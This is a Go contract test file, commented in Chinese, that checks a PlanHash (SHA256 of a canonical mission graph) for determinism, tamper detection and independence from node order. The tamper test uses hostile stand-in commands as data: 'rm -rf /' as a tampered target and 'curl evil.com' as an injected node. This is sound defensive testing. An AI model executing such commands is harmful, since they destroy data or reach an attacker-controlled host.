// planhash_contract_test.go — PlanHash 契约测试（R-859 — 会议 #158）
// TC-PH-001 ~ TC-PH-003。
//
// 测试层级: L2 契约测试
// 对应需求: R-859 [MUST] PlanHash = SHA256(canonicalJSON(MissionGraph)) 确定性、防篡改
package events

import (
	"crypto/sha256"
	"encoding/json"
	"fmt"
	"sort"
	"testing"
)

// missionNodeRep 是 MissionGraph 节点的规范化表示（与 missionengine.go PlanHash 一致）。
type missionNodeRep struct {
	ID          string `json:"id"`
	Type        string `json:"type"`
	Description string `json:"description"`
	ActionType  string `json:"action_type"`
	Target      string `json:"target"`
}

// computePlanHash 计算 MissionGraph 的 PlanHash（与 missionengine.PlanHash 等价实现）。
func computePlanHash(nodes []missionNodeRep) string {
	sort.Slice(nodes, func(i, j int) bool { return nodes[i].ID < nodes[j].ID })
	data, _ := json.Marshal(map[string]interface{}{
		"node_count": len(nodes),
		"nodes":      nodes,
	})
	h := sha256.Sum256(data)
	return fmt.Sprintf("%x", h)
}

// ─── TC-PH-001: PlanHash 确定性（R-859）───────────────────────────────

func TestContract_PlanHash_Deterministic_SameInputSameOutput(t *testing.T) {
	// TC-PH-001: 相同输入→相同 PlanHash
	// 对应: R-859 [MUST] PlanHash = SHA256(canonicalJSON) 确定性
	nodes := []missionNodeRep{
		{ID: "node-3", Type: "action", ActionType: "shell.execute", Target: "npm test"},
		{ID: "node-1", Type: "mission", Description: "Setup"},
		{ID: "node-2", Type: "action", ActionType: "fs.write", Target: "index.html"},
	}

	hash1 := computePlanHash(nodes)
	hash2 := computePlanHash(nodes)
	hash3 := computePlanHash(nodes)

	if hash1 != hash2 || hash2 != hash3 {
		t.Errorf("TC-PH-001 FAIL: PlanHash not deterministic. h1=%s h2=%s h3=%s", hash1[:12], hash2[:12], hash3[:12])
	}

	// [MUST] 64 字符 hex 格式
	if len(hash1) != 64 {
		t.Errorf("TC-PH-001: PlanHash length should be 64 (SHA256 hex), got %d", len(hash1))
	}

	t.Logf("TC-PH-001 PASS: PlanHash=%s (deterministic over 3 runs)", hash1[:12])
}

// ─── TC-PH-002: PlanHash 防篡改——修改节点改变哈希（R-859）───────────

func TestContract_PlanHash_TamperDetection(t *testing.T) {
	// TC-PH-002: 修改任何节点属性→PlanHash 必须改变
	// 对应: R-859 [MUST] PlanHash 不一致→MissionGraphRejected

	original := []missionNodeRep{
		{ID: "act-1", Type: "action", ActionType: "fs.write", Target: "output/index.html"},
		{ID: "act-2", Type: "action", ActionType: "shell.execute", Target: "npm install"},
	}

	origHash := computePlanHash(original)

	// 篡改 1: 修改 Target
	tampered1 := []missionNodeRep{
		{ID: "act-1", Type: "action", ActionType: "fs.write", Target: "output/index.html"},
		{ID: "act-2", Type: "action", ActionType: "shell.execute", Target: "rm -rf /"}, // Tampered!
	}
	tampered1Hash := computePlanHash(tampered1)
	if tampered1Hash == origHash {
		t.Error("TC-PH-002 FAIL: target tamper NOT detected (same hash)")
	}

	// 篡改 2: 新增节点
	tampered2 := []missionNodeRep{
		{ID: "act-1", Type: "action", ActionType: "fs.write", Target: "output/index.html"},
		{ID: "act-2", Type: "action", ActionType: "shell.execute", Target: "npm install"},
		{ID: "act-3", Type: "action", ActionType: "shell.execute", Target: "curl evil.com"}, // Injected!
	}
	tampered2Hash := computePlanHash(tampered2)
	if tampered2Hash == origHash {
		t.Error("TC-PH-002 FAIL: node injection NOT detected (same hash)")
	}

	// 篡改 3: 删除节点
	tampered3 := []missionNodeRep{
		{ID: "act-1", Type: "action", ActionType: "fs.write", Target: "output/index.html"},
	}
	tampered3Hash := computePlanHash(tampered3)
	if tampered3Hash == origHash {
		t.Error("TC-PH-002 FAIL: node deletion NOT detected (same hash)")
	}

	t.Logf("TC-PH-002 PASS: original=%s tampered_target=%s tampered_injection=%s tampered_deletion=%s",
		origHash[:12], tampered1Hash[:12], tampered2Hash[:12], tampered3Hash[:12])
}

// ─── TC-PH-003: PlanHash 排序无关性（R-859）───────────────────────────

func TestContract_PlanHash_OrderInvariance(t *testing.T) {
	// TC-PH-003: 节点顺序不同但内容相同→相同 PlanHash
	// 对应: R-859 使用 sorted keys + compact JSON 确保确定性

	order1 := []missionNodeRep{
		{ID: "b", Type: "action", ActionType: "fs.write", Target: "f2"},
		{ID: "a", Type: "action", ActionType: "fs.write", Target: "f1"},
		{ID: "c", Type: "action", ActionType: "shell.execute", Target: "f3"},
	}

	order2 := []missionNodeRep{
		{ID: "c", Type: "action", ActionType: "shell.execute", Target: "f3"},
		{ID: "a", Type: "action", ActionType: "fs.write", Target: "f1"},
		{ID: "b", Type: "action", ActionType: "fs.write", Target: "f2"},
	}

	hash1 := computePlanHash(order1)
	hash2 := computePlanHash(order2)

	if hash1 != hash2 {
		t.Errorf("TC-PH-003 FAIL: PlanHash should be order-independent. h1=%s h2=%s", hash1[:12], hash2[:12])
	}

	t.Logf("TC-PH-003 PASS: PlanHash=%s (order-independent)", hash1[:12])
}
